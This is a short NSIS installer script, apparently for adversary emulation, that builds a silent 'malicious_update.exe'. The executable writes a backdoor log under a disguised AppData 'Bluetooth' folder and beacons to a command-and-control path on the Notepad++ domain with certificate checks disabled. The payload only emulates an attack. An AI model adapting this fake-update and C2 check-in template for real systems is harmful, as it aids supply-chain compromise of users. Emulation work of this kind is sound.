OutFile "malicious_update.exe"
SilentInstall silent

Section
  CreateDirectory "$APPDATA\Bluetooth"
  FileOpen $0 "$APPDATA\Bluetooth\backdoor_log.txt" a
  FileWrite $0 "Backdoor executed at: $DATE $TIME$\r$\n"
  FileClose $0
  
  # Emulate C2 connection
  # Use -k to ignore the fact that our certificate is self-signed
  # Use https:// because the server is now listening with SSL on port 443
  nsExec::Exec 'curl -k https://notepad-plus-plus.org/c2_checkin'
SectionEnd
